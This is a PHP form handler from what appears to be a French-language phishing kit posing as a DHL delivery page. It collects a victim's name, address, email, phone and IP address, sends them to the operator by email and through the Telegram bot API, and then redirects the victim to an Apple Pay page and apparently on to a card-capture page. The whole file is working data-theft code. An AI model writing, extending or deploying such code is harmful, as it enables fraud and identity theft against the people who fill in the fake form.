<?php
    session_start();
    include("../common/functions.php");
    include("../common/sub_includes.php");
    require("../config.php");

    // Robust POST validation
    $required = ["last-name", "first-name", "email", "telephone", "zip-code", "adresse", "city"];
    $missing = [];
    foreach ($required as $field) {
        if (empty($_POST[$field])) {
            $missing[] = $field;
        }
    }

    // If accessed via GET or missing fields, show friendly error
    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || count($missing) > 0) {
        echo '<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><title>Erreur de formulaire</title>';
        echo '<style>body{font-family:sans-serif;background:#f8d7da;color:#721c24;} .error-box{max-width:400px;margin:60px auto;padding:30px;background:#fff0f1;border:1px solid #f5c6cb;border-radius:8px;text-align:center;} a{color:#721c24;text-decoration:underline;}</style>';
        echo '</head><body><div class="error-box">';
        echo '<h2>Erreur de soumission</h2>';
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            echo '<p>Veuillez remplir le formulaire depuis la page d’accueil.</p>';
        } else {
            echo '<p>Champs manquants :</p><ul style="text-align:left;">';
            foreach ($missing as $m) echo '<li>' . htmlspecialchars($m) . '</li>';
            echo '</ul><p>Veuillez compléter tous les champs.</p>';
        }
        echo '<a href="../index.php">Retour à l’accueil</a>';
        echo '</div></body></html>';
        exit();
    }

    $_SESSION["nom"]    = $_POST["last-name"];
    $_SESSION["prenom"] = $_POST["first-name"];
    $_SESSION["fullname"] = $_POST["last-name"] . " " . $_POST["first-name"];
    $_SESSION["email"]  = $_POST["email"];
    $_SESSION["phone"]  = $_POST["telephone"];
    $_SESSION["zip"]    = $_POST["zip-code"];
    $_SESSION["adress"] = $_POST["adresse"];
    $_SESSION["city"]   = $_POST["city"];

    $message = "\n[📦] DHL INFOS [📦]\n\n👤 Nom: " . $_SESSION["nom"] . "\n👤 Prenom: " . $_SESSION["prenom"] . "\n👤 Adresse: " . $_SESSION["adress"] . "\n👤 City: " . $_SESSION["city"] . "\n👤 ZIP:" . $_SESSION["zip"] . "\n\n👤 Email: " . $_SESSION["email"] . "\n👤 Phone: " . $_SESSION["phone"] . "\n👤 Adresse IP: " . _ip() . "\n    ";

    if ($rezmail) {
        $Subject = "📦 +1 INFOS ・ " . $_SESSION['email'] . " ・ " . $_SESSION['fullname'] . " ・ " . _ip();
        $head = "From: 🥤 OxParadox <info@paradox.infos>";
        mail($mail, $Subject, $message, $head);
    }

    if ($reztelegram) {
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query(['text' => $message, 'chat_id' => $chat_id]));
    }

    // Enforce payment: redirect to payment page (applepay.php) before card.php
    $_SESSION['payment_complete'] = false;
    header("Location: ../applepay.php");
    exit();
?>